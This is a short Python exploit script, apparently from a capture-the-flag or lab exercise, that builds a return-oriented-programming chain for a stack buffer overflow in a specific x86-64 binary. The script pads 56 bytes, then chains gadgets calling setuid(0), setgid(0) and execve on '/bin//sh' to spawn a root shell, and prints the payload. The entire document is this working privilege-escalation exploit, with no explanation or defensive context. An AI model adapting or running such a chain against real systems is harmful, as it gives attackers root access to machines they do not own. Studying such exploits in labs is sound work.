#!/usr/bin/env python
from struct import pack

stack_offset = 56

rop = ''
# setuid(0)
rop += pack('<Q', 0x000000000046dbf7)  # pop rax; ret;
rop += pack('<Q', 0x0000000000000069)  # syscall
rop += pack('<Q', 0x0000000000400646)  # pop rdi ; ret
rop += pack('<Q', 0x0000000000000000)  # 0
rop += pack('<Q', 0x0000000000442025)  # syscall; ret
# setgid(0)
rop += pack('<Q', 0x000000000046dbf7)  # pop rax; ret;
rop += pack('<Q', 0x000000000000006a)  # syscall
rop += pack('<Q', 0x0000000000400646)  # pop rdi ; ret
rop += pack('<Q', 0x0000000000000000)  # 0
rop += pack('<Q', 0x0000000000442025)  # syscall; ret
# execve /bin/sh
rop += pack('<Q', 0x0000000000401837)  # pop rsi ; ret
rop += pack('<Q', 0x00000000006b10c0)  # @ .data
rop += pack('<Q', 0x000000000046dbf7)  # pop rax ; ret
rop += '/bin//sh'
rop += pack('<Q', 0x00000000004777e1)  # mov qword ptr [rsi], rax ; ret

rop += pack('<Q', 0x0000000000401837)  # pop rsi ; ret
rop += pack('<Q', 0x00000000006b10c8)  # @ .data + 8
rop += pack('<Q', 0x000000000043dc30)  # xor rax, rax ; ret
rop += pack('<Q', 0x00000000004777e1)  # mov qword ptr [rsi], rax ; ret

rop += pack('<Q', 0x0000000000400646)  # pop rdi ; ret
rop += pack('<Q', 0x00000000006b10c0)  # @ .data
rop += pack('<Q', 0x0000000000401837)  # pop rsi ; ret
rop += pack('<Q', 0x00000000006b10c8)  # @ .data + 8
rop += pack('<Q', 0x0000000000445526)  # pop rdx ; ret
rop += pack('<Q', 0x00000000006b10c8)  # @ .data + 8
rop += pack('<Q', 0x000000000046dbf7)  # pop rax; ret;
rop += pack('<Q', 0x000000000000003b)  # syscall number
rop += pack('<Q', 0x00000000004011d4)  # syscall

buffer = "A" * stack_offset + rop
print(buffer)

